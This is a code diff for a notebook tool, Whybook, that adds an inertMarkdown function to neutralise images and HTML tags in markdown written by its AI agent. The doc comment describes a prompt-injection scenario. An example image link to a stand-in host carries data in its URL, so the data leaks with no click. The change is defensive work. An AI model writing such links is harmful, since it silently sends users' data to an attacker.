@@ -282,11 +282,27 @@ export function introText(options: {
   kernel: IKernelChoice;
 }): string {
   const { title, question, first, kernel } = options;
-  return [
-    `# ${title}, in ${kernel.label}`,
-    '',
-    `Whybook's agent made this notebook for the question "${question}", asked in ${PathExt.basename(first)}. The cells after this one are the agent's, and ${kernel.displayName} runs them.`
-  ].join('\n');
+  return inertMarkdown(
+    [
+      `# ${title}, in ${kernel.label}`,
+      '',
+      `Whybook's agent made this notebook for the question "${question}", asked in ${PathExt.basename(first)}. The cells after this one are the agent's, and ${kernel.displayName} runs them.`
+    ].join('\n')
+  );
+}
+
+/**
+ * Markdown with a model's text in it, made so that nothing in it loads by
+ * itself when the cell shows, in Whybook or in JupyterLab's notebook.
+ * JupyterLab's sanitizer keeps images, video, audio, image inputs and CSS
+ * backgrounds with a URL, so a model that a prompt injection steers could
+ * write `![x](https://example.com/?d=...)` and send data out with no click.
+ * An image shows as its text, `!\[x](...)`, and an HTML tag as its text,
+ * `&lt;img ...>`. Links, code, bold, lists and tables render as before; in a
+ * code span, a tag shows its `&lt;`.
+ */
+export function inertMarkdown(text: string): string {
+  return text.replace(/!\[/g, '!\\[').replace(/<(?=[A-Za-z/!?])/g, '&lt;');
 }
 
 /** What a kernel has, as its kernel_facts program says, for the agent. */
@@ -779,5 +795,5 @@ export function comparisonMarkdown(options: {
   if (answer) {
     lines.push('', `**The agent's answer.** ${answer}`);
   }
-  return lines.join('\n');
+  return inertMarkdown(lines.join('\n'));
 }
